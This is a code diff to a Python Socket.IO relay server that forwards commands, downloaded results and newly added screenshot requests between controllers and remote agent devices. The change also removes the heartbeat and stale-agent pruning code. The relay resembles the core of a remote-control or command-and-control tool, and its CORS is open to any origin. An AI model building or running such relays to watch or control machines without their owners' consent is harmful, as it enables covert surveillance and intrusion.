@@ -3,8 +3,6 @@ import eventlet
 import eventlet.wsgi
 from agent_registry import AgentRegistry
 
-HEARTBEAT_TIMEOUT = 30  # Agent is considered stale after 30 seconds
-CHECK_INTERVAL = 10      # Check for stale agents every 10 seconds
 
 sio = socketio.Server(
     cors_allowed_origins="*",
@@ -73,15 +71,6 @@ def get_agents(sid):
     print(f"----------Client {sid} requested agent list.----------")
     public_agents = _get_public_agents()
     sio.emit("agents_update", public_agents, to=sid)
-
-# heartbeat
-
-@sio.event
-def heartbeat(sid, data):
-    """Handles heartbeat from an agent."""
-    device_id = data.get("device_id")
-    if device_id:
-        agent_registry.update_last_seen(device_id)
 
 
 # forwarding command to agent
@@ -213,24 +202,54 @@ def download_result(sid, data):
         data,
         to=controller_sid
     )
+  
+    # screenshot
     
-def check_stale_agents():
-    """Periodically checks for and removes stale agents."""
-    while True:
-        eventlet.sleep(CHECK_INTERVAL)
-        removed_agents = agent_registry.prune_stale_agents(HEARTBEAT_TIMEOUT)
-        if removed_agents:
-            print(f"----------REMOVED STALE AGENTS---------- {removed_agents}")
-            broadcast_agent_update()
+# Screenshot
+
+@sio.event()
+def screenshot(sid, data):
+    
+    target = data["target"]
+    
+    if not agent_registry.is_agent_online(target):
+        sio.emit(
+            "screenshot_result",
+            {
+                "status": "error",
+                "message": f"Agent '{target}' not found or is offline."
+            },
+            to=sid
+        )
+        return 
+    
+    target_sid = agent_registry.get_sid(target)
+    
+    # Add controller SID for response routing
+    
+    data['controller_sid'] = sid
+    
+    sio.emit(
+        "screenshot",
+        data,
+        to=target_sid
+    )
+    
+@sio.event()
+def screenshot_result(sid, data):
+    
+    # Forwarding Screenshot result back to controller
+    
+    controller_sid = data.get("controller_sid")
+    if controller_sid:
+        sio.emit("screenshot_result", data, to=controller_sid)
+    else:
+        print(f"Warning: Received 'screenshot_result' from agent {sid} without a 'controller_sid'. Cannot forward.")
 
 
-# server starting 
 
 if __name__ == "__main__":
     print("----------Relay server started on port 5000----------")
-
-    # Spawn the background task to check for stale agents
-    eventlet.spawn(check_stale_agents)
 
     eventlet.wsgi.server(
         eventlet.listen(("0.0.0.0", 5000)),
